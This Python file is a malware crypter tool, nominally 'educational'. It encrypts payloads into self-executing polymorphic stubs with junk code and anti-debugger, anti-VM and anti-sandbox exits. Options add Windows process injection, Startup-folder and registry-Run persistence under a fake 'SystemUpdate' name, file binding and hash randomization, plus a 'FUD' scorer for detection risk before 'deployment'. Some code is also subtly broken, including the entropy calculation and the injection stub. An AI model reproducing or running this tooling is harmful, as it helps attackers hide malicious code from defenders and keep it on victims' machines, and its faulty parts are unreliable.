#!/usr/bin/env python3
"""
Advanced Evasion Techniques (AET) Crypter Module
Educational demonstration of payload encryption and evasion techniques
WARNING: Use only for authorized security testing!
"""

import os
import sys
import base64
import zlib
import random
import string
import hashlib
import time
from datetime import datetime
from colorama import Fore, Style

class AdvancedCrypter:
    def __init__(self):
        self.crypted_dir = "crypted"
        if not os.path.exists(self.crypted_dir):
            os.makedirs(self.crypted_dir)
    
    def print_banner(self):
        """Print crypter banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║        {Fore.YELLOW}Advanced Evasion Techniques (AET) Crypter{Fore.CYAN}          ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.RED}WARNING: Use only for authorized security testing!{Fore.CYAN}        ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def generate_random_key(self, length=32):
        """Generate random encryption key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def encrypt_payload(self, payload_data, encryption_method='xor'):
        """Encrypt payload using various methods"""
        if encryption_method == 'xor':
            key = self.generate_random_key(16)
            encrypted = bytearray()
            for i, byte in enumerate(payload_data.encode() if isinstance(payload_data, str) else payload_data):
                encrypted.append(byte ^ ord(key[i % len(key)]))
            return bytes(encrypted), key
        elif encryption_method == 'base64':
            encoded = base64.b64encode(payload_data.encode() if isinstance(payload_data, str) else payload_data)
            return encoded, None
        elif encryption_method == 'aes_simple':
            # Simple AES-like encryption (educational)
            key = self.generate_random_key(32)
            encrypted = base64.b64encode(zlib.compress(payload_data.encode() if isinstance(payload_data, str) else payload_data))
            return encrypted, key
        else:
            return payload_data, None
    
    def obfuscate_code(self, code):
        """Obfuscate Python code"""
        # Variable name obfuscation
        var_map = {}
        counter = 0
        
        # Simple obfuscation - replace variable names
        lines = code.split('\n')
        obfuscated = []
        
        for line in lines:
            # Add junk code randomly
            if random.random() < 0.1:
                junk_vars = [f"_{''.join(random.choices(string.ascii_lowercase, k=8))}" for _ in range(2)]
                obfuscated.append(f"    {junk_vars[0]} = {random.randint(1000, 9999)}; {junk_vars[1]} = '{self.generate_random_key(10)}'")
            
            obfuscated.append(line)
        
        return '\n'.join(obfuscated)
    
    def encrypt_strings(self, code):
        """Encrypt strings in code"""
        import re
        
        def encrypt_string(match):
            s = match.group(1)
            encoded = base64.b64encode(s.encode()).decode()
            return f'base64.b64decode("{encoded}").decode()'
        
        # Encrypt string literals
        pattern = r'"([^"]+)"'
        code = re.sub(pattern, encrypt_string, code)
        pattern = r"'([^']+)'"
        code = re.sub(pattern, encrypt_string, code)
        
        return code
    
    def generate_anti_debugging(self):
        """Generate anti-debugging code"""
        anti_debug = '''
# Anti-Debugging Techniques
import sys
import os

def check_debugger():
    """Check for debugger presence"""
    try:
        # Check for common debugger processes
        debuggers = ['ollydbg', 'x64dbg', 'windbg', 'ida', 'wireshark', 'fiddler']
        if sys.platform == 'win32':
            import subprocess
            proc_list = subprocess.check_output('tasklist', shell=True).decode().lower()
            for dbg in debuggers:
                if dbg in proc_list:
                    return True
    except:
        pass
    return False

def check_vm():
    """Check for virtual machine"""
    try:
        if sys.platform == 'win32':
            import subprocess
            # Check for VM artifacts
            vm_artifacts = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
            system_info = subprocess.check_output('systeminfo', shell=True).decode().lower()
            for artifact in vm_artifacts:
                if artifact in system_info:
                    return True
    except:
        pass
    return False

def check_sandbox():
    """Check for sandbox environment"""
    try:
        # Check for low resources (sandbox indicator)
        import psutil
        if psutil.cpu_count() < 2:
            return True
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
            return True
    except:
        pass
    return False

# Run checks
if check_debugger() or check_vm() or check_sandbox():
    sys.exit(0)
'''
        return anti_debug
    
    def generate_polymorphic_stub(self, encrypted_payload, key, encryption_method='xor'):
        """Generate polymorphic stub with runtime decryption"""
        stub_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Generate random variable names
        var_names = {
            'payload': f"_{''.join(random.choices(string.ascii_lowercase, k=8))}",
            'key': f"_{''.join(random.choices(string.ascii_lowercase, k=8))}",
            'decrypted': f"_{''.join(random.choices(string.ascii_lowercase, k=8))}",
            'exec_code': f"_{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        
        if encryption_method == 'xor':
            decrypt_code = f'''
{var_names['payload']} = {list(encrypted_payload)}
{var_names['key']} = "{key}"
{var_names['decrypted']} = bytearray()
for {var_names['exec_code']} in range(len({var_names['payload']})):
    {var_names['decrypted']}.append({var_names['payload']}[{var_names['exec_code']}] ^ ord({var_names['key']}[{var_names['exec_code']} % len({var_names['key']})]))
exec({var_names['decrypted']}.decode())
'''
        elif encryption_method == 'base64':
            payload_b64 = base64.b64encode(encrypted_payload).decode() if isinstance(encrypted_payload, bytes) else base64.b64encode(encrypted_payload.encode()).decode()
            decrypt_code = f'''
import base64
{var_names['payload']} = "{payload_b64}"
{var_names['decrypted']} = base64.b64decode({var_names['payload']}).decode()
exec({var_names['decrypted']})
'''
        else:
            payload_b64 = base64.b64encode(encrypted_payload).decode() if isinstance(encrypted_payload, bytes) else base64.b64encode(encrypted_payload.encode()).decode()
            decrypt_code = f'''
import base64, zlib
{var_names['payload']} = "{payload_b64}"
{var_names['key']} = "{key}"
{var_names['decrypted']} = zlib.decompress(base64.b64decode({var_names['payload']})).decode()
exec({var_names['decrypted']})
'''
        
        # Add junk code
        junk_code = self.generate_junk_code()
        
        # Combine with anti-debugging
        anti_debug = self.generate_anti_debugging()
        
        stub = f'''#!/usr/bin/env python3
# Polymorphic Stub - Generated by AET Crypter
# Stub ID: {stub_id}
# Generated: {datetime.now().isoformat()}

{junk_code}

{anti_debug}

# Runtime Decryption
{decrypt_code}
'''
        return stub
    
    def generate_junk_code(self, count=5):
        """Generate junk code to confuse analysis"""
        junk = []
        for _ in range(count):
            var_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
            value = random.choice([
                random.randint(1000, 99999),
                f'"{self.generate_random_key(random.randint(10, 30))}"',
                f"[{', '.join([str(random.randint(1, 100)) for _ in range(3)])}]"
            ])
            junk.append(f"    {var_name} = {value}")
        
        return '\n'.join(junk)
    
    def generate_process_injection_stub(self, payload_code):
        """Generate process injection code"""
        injection_code = f'''
# Process Injection Stub
import ctypes
import sys

def inject_payload():
    """Inject payload into current process"""
    try:
        # Allocate memory
        MEM_COMMIT = 0x1000
        PAGE_EXECUTE_READWRITE = 0x40
        
        if sys.platform == 'win32':
            kernel32 = ctypes.windll.kernel32
            payload_bytes = {repr(payload_code.encode())}
            
            # Allocate memory
            mem = kernel32.VirtualAlloc(
                0, len(payload_bytes), MEM_COMMIT, PAGE_EXECUTE_READWRITE
            )
            
            if mem:
                # Write payload to memory
                ctypes.memmove(mem, payload_bytes, len(payload_bytes))
                
                # Create thread to execute
                thread = kernel32.CreateThread(
                    0, 0, mem, 0, 0, 0
                )
                if thread:
                    kernel32.WaitForSingleObject(thread, -1)
    except:
        pass

inject_payload()
'''
        return injection_code
    
    def generate_persistence_code(self, persistence_method='startup'):
        """Generate persistence code"""
        if persistence_method == 'startup':
            if sys.platform == 'win32':
                return '''
# Startup Persistence (Windows)
import os
import shutil
import winreg

def add_to_startup():
    try:
        current_file = os.path.abspath(__file__)
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_path, os.path.basename(current_file))
        
        if not os.path.exists(target_path):
            shutil.copy2(current_file, target_path)
            
        # Also add to registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
    except:
        pass

add_to_startup()
'''
            else:
                return '''
# Startup Persistence (Linux)
import os
import shutil

def add_to_startup():
    try:
        current_file = os.path.abspath(__file__)
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        target_path = os.path.join(autostart_dir, os.path.basename(current_file))
        shutil.copy2(current_file, target_path)
        os.chmod(target_path, 0o755)
    except:
        pass

add_to_startup()
'''
        return ''
    
    def randomize_hash(self, file_path):
        """Randomize file hash by adding junk data"""
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Add random bytes at the end
            junk = os.urandom(random.randint(100, 1000))
            with open(file_path, 'ab') as f:
                f.write(junk)
            
            return True
        except:
            return False
    
    def compress_file(self, file_path):
        """Compress file"""
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            compressed = zlib.compress(content)
            compressed_path = file_path + '.compressed'
            with open(compressed_path, 'wb') as f:
                f.write(compressed)
            
            return compressed_path
        except:
            return None
    
    def create_binder(self, files, output_path):
        """Bind multiple files together"""
        binder_code = f'''#!/usr/bin/env python3
# File Binder - Merges multiple files
import os
import sys
import tempfile

# Extract and execute bound files
bound_files = {repr(files)}

def extract_files():
    """Extract bound files to temp directory"""
    temp_dir = tempfile.mkdtemp()
    extracted = []
    
    for i, (name, content) in enumerate(bound_files):
        file_path = os.path.join(temp_dir, name)
        with open(file_path, 'wb') as f:
            f.write(content)
        extracted.append(file_path)
    
    return extracted, temp_dir

# Extract files
extracted_files, temp_dir = extract_files()

# Execute primary payload (first file)
if extracted_files:
    exec(open(extracted_files[0]).read())

# Cleanup
import shutil
shutil.rmtree(temp_dir, ignore_errors=True)
'''
        
        with open(output_path, 'w') as f:
            f.write(binder_code)
        
        return output_path
    
    def preserve_eof(self, original_file, payload_file):
        """Preserve end-of-file markers"""
        try:
            with open(original_file, 'rb') as f:
                original = f.read()
            
            # Append original EOF data to payload
            with open(payload_file, 'ab') as f:
                f.write(b'\x00' * 100)  # EOF padding
                f.write(original[-100:])  # Last 100 bytes of original
            
            return True
        except:
            return False
    
    def generate_fud_stub(self, payload_path, options):
        """Generate Fully UnDetectable (FUD) stub with all evasion techniques"""
        print(f"{Fore.YELLOW}[*] Generating FUD stub with advanced evasion...{Style.RESET_ALL}")
        
        # Read original payload
        try:
            with open(payload_path, 'r', encoding='utf-8', errors='ignore') as f:
                payload_code = f.read()
        except:
            with open(payload_path, 'rb') as f:
                payload_code = f.read().decode('utf-8', errors='ignore')
        
        # Apply obfuscation
        if options.get('obfuscate', True):
            print(f"{Fore.CYAN}[*] Applying code obfuscation...{Style.RESET_ALL}")
            payload_code = self.obfuscate_code(payload_code)
        
        # Encrypt strings
        if options.get('encrypt_strings', True):
            print(f"{Fore.CYAN}[*] Encrypting strings...{Style.RESET_ALL}")
            payload_code = self.encrypt_strings(payload_code)
        
        # Encrypt payload
        encryption_method = options.get('encryption', 'xor')
        print(f"{Fore.CYAN}[*] Encrypting payload ({encryption_method})...{Style.RESET_ALL}")
        encrypted_payload, key = self.encrypt_payload(payload_code, encryption_method)
        
        # Generate polymorphic stub
        print(f"{Fore.CYAN}[*] Generating polymorphic stub...{Style.RESET_ALL}")
        stub = self.generate_polymorphic_stub(encrypted_payload, key, encryption_method)
        
        # Add anti-debugging (already in stub)
        print(f"{Fore.CYAN}[*] Anti-debugging techniques added...{Style.RESET_ALL}")
        
        # Add process injection if requested
        if options.get('process_injection', False):
            print(f"{Fore.CYAN}[*] Adding process injection...{Style.RESET_ALL}")
            injection = self.generate_process_injection_stub(payload_code)
            stub = injection + '\n' + stub
        
        # Add persistence if requested
        if options.get('persistence', False):
            print(f"{Fore.CYAN}[*] Adding startup persistence...{Style.RESET_ALL}")
            persistence = self.generate_persistence_code(options.get('persistence_method', 'startup'))
            stub = persistence + '\n' + stub
        
        return stub
    
    def fud_test_automation(self, file_path):
        """FUD testing automation - check detection"""
        print(f"\n{Fore.YELLOW}[*] Running FUD testing automation...{Style.RESET_ALL}")
        
        results = {
            'file_size': 0,
            'hash_md5': '',
            'hash_sha256': '',
            'entropy': 0,
            'detection_score': 0
        }
        
        try:
            # Calculate file size
            results['file_size'] = os.path.getsize(file_path)
            print(f"{Fore.CYAN}[*] File size: {results['file_size']} bytes{Style.RESET_ALL}")
            
            # Calculate hashes
            with open(file_path, 'rb') as f:
                content = f.read()
                results['hash_md5'] = hashlib.md5(content).hexdigest()
                results['hash_sha256'] = hashlib.sha256(content).hexdigest()
            
            print(f"{Fore.CYAN}[*] MD5: {results['hash_md5']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] SHA256: {results['hash_sha256']}{Style.RESET_ALL}")
            
            # Calculate entropy (randomness measure)
            if content:
                entropy = self.calculate_entropy(content)
                results['entropy'] = entropy
                print(f"{Fore.CYAN}[*] Entropy: {entropy:.2f} (higher = more obfuscated){Style.RESET_ALL}")
            
            # Detection score (lower is better)
            detection_score = 0
            
            # Check for suspicious patterns
            suspicious_patterns = [b'exec(', b'eval(', b'__import__', b'subprocess']
            for pattern in suspicious_patterns:
                if pattern in content:
                    detection_score += 10
            
            # Check entropy (low entropy = less obfuscated)
            if entropy < 4.0:
                detection_score += 20
            
            results['detection_score'] = detection_score
            
            print(f"\n{Fore.CYAN}[*] Detection Score: {detection_score}/100{Style.RESET_ALL}")
            if detection_score < 30:
                print(f"{Fore.GREEN}[+] Low detection risk{Style.RESET_ALL}")
            elif detection_score < 60:
                print(f"{Fore.YELLOW}[!] Medium detection risk{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] High detection risk - consider more obfuscation{Style.RESET_ALL}")
            
            return results
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error during FUD testing: {e}{Style.RESET_ALL}")
            return None
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy"""
        if not data:
            return 0
        
        entropy = 0
        for x in range(256):
            p_x = float(data.count(bytes([x]))) / len(data)
            if p_x > 0:
                entropy += - p_x * (p_x.bit_length() - 1)
        
        return entropy
    
    def run(self):
        """Run crypter interface"""
        self.print_banner()
        
        print(f"{Fore.YELLOW}[*] Select operation:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} Encrypt/Obfuscate Payload{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} Generate FUD Stub (All Techniques){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} Bind Multiple Files{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[4]{Fore.CYAN} Compress Payload{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[5]{Fore.CYAN} Randomize Hash{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[6]{Fore.CYAN} FUD Testing Automation{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}[*] Select option: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self.encrypt_payload_menu()
        elif choice == '2':
            self.generate_fud_menu()
        elif choice == '3':
            self.bind_files_menu()
        elif choice == '4':
            self.compress_menu()
        elif choice == '5':
            self.randomize_hash_menu()
        elif choice == '6':
            file_path = input(f"{Fore.YELLOW}[*] Enter file path to test: {Style.RESET_ALL}").strip()
            if os.path.exists(file_path):
                self.fud_test_automation(file_path)
            else:
                print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
    
    def encrypt_payload_menu(self):
        """Encrypt payload menu"""
        payload_path = input(f"{Fore.YELLOW}[*] Enter payload file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] Encryption methods:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} XOR{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} Base64{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} AES-like (Compressed){Style.RESET_ALL}")
        
        enc_choice = input(f"{Fore.YELLOW}[*] Select method: {Style.RESET_ALL}").strip()
        methods = {'1': 'xor', '2': 'base64', '3': 'aes_simple'}
        method = methods.get(enc_choice, 'xor')
        
        # Read payload
        with open(payload_path, 'r', encoding='utf-8', errors='ignore') as f:
            payload = f.read()
        
        # Encrypt
        encrypted, key = self.encrypt_payload(payload, method)
        
        # Generate stub
        stub = self.generate_polymorphic_stub(encrypted, key, method)
        
        # Save
        output_name = os.path.basename(payload_path).replace('.py', '_encrypted.py')
        output_path = os.path.join(self.crypted_dir, output_name)
        with open(output_path, 'w') as f:
            f.write(stub)
        
        print(f"\n{Fore.GREEN}[+] Encrypted payload saved: {output_path}{Style.RESET_ALL}")
        if key:
            print(f"{Fore.CYAN}[*] Encryption key: {key}{Style.RESET_ALL}")
    
    def generate_fud_menu(self):
        """Generate FUD stub menu"""
        payload_path = input(f"{Fore.YELLOW}[*] Enter payload file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] Configure evasion techniques:{Style.RESET_ALL}")
        
        options = {
            'obfuscate': input(f"{Fore.YELLOW}[*] Enable code obfuscation? (y/n, default y): {Style.RESET_ALL}").strip().lower() != 'n',
            'encrypt_strings': input(f"{Fore.YELLOW}[*] Enable string encryption? (y/n, default y): {Style.RESET_ALL}").strip().lower() != 'n',
            'encryption': input(f"{Fore.YELLOW}[*] Encryption method (xor/base64/aes, default xor): {Style.RESET_ALL}").strip() or 'xor',
            'process_injection': input(f"{Fore.YELLOW}[*] Enable process injection? (y/n, default n): {Style.RESET_ALL}").strip().lower() == 'y',
            'persistence': input(f"{Fore.YELLOW}[*] Enable startup persistence? (y/n, default n): {Style.RESET_ALL}").strip().lower() == 'y',
            'persistence_method': 'startup'
        }
        
        # Generate FUD stub
        stub = self.generate_fud_stub(payload_path, options)
        
        # Save
        output_name = os.path.basename(payload_path).replace('.py', '_fud.py')
        output_path = os.path.join(self.crypted_dir, output_name)
        with open(output_path, 'w') as f:
            f.write(stub)
        
        # Randomize hash
        if input(f"{Fore.YELLOW}[*] Randomize file hash? (y/n): {Style.RESET_ALL}").strip().lower() == 'y':
            self.randomize_hash(output_path)
            print(f"{Fore.GREEN}[+] Hash randomized{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] FUD stub generated: {output_path}{Style.RESET_ALL}")
        
        # Run FUD testing
        if input(f"{Fore.YELLOW}[*] Run FUD testing automation? (y/n): {Style.RESET_ALL}").strip().lower() == 'y':
            self.fud_test_automation(output_path)
        
        print(f"{Fore.YELLOW}[!] Test the stub before deployment!{Style.RESET_ALL}")
    
    def bind_files_menu(self):
        """Bind files menu"""
        files = []
        print(f"{Fore.YELLOW}[*] Enter files to bind (press Enter with empty path to finish):{Style.RESET_ALL}")
        
        while True:
            file_path = input(f"{Fore.YELLOW}[*] File path: {Style.RESET_ALL}").strip()
            if not file_path:
                break
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read()
                files.append((os.path.basename(file_path), content))
                print(f"{Fore.GREEN}[+] Added: {file_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
        
        if not files:
            print(f"{Fore.RED}[!] No files to bind{Style.RESET_ALL}")
            return
        
        output_name = input(f"{Fore.YELLOW}[*] Output filename (default: binder.py): {Style.RESET_ALL}").strip() or "binder.py"
        output_path = os.path.join(self.crypted_dir, output_name)
        
        self.create_binder(files, output_path)
        print(f"\n{Fore.GREEN}[+] Binder created: {output_path}{Style.RESET_ALL}")
    
    def compress_menu(self):
        """Compress file menu"""
        file_path = input(f"{Fore.YELLOW}[*] Enter file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(file_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        compressed = self.compress_file(file_path)
        if compressed:
            print(f"\n{Fore.GREEN}[+] Compressed file: {compressed}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Compression failed{Style.RESET_ALL}")
    
    def randomize_hash_menu(self):
        """Randomize hash menu"""
        file_path = input(f"{Fore.YELLOW}[*] Enter file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(file_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        if self.randomize_hash(file_path):
            # Calculate new hash
            with open(file_path, 'rb') as f:
                file_hash = hashlib.md5(f.read()).hexdigest()
            print(f"\n{Fore.GREEN}[+] Hash randomized{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] New MD5: {file_hash}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Failed to randomize hash{Style.RESET_ALL}")

